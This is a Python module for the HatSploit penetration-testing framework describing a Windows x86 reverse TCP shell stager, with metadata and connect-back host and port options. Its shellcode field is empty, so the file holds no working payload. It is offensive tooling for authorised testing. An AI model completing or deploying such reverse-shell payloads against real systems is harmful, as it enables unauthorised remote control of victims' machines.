#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "Windows x86 Shell Reverse TCP",
        'Payload': "windows/x86/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Reverse shell TCP payload for Windows x86.",
        'Architecture': "x86",
        'Platform': "windows",
        'Rank': "low",
        'Type': "reverse_tcp"
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        return (
            b""
        ), {
            'cbhost': connback_host,
            'cbport': connback_port
        }
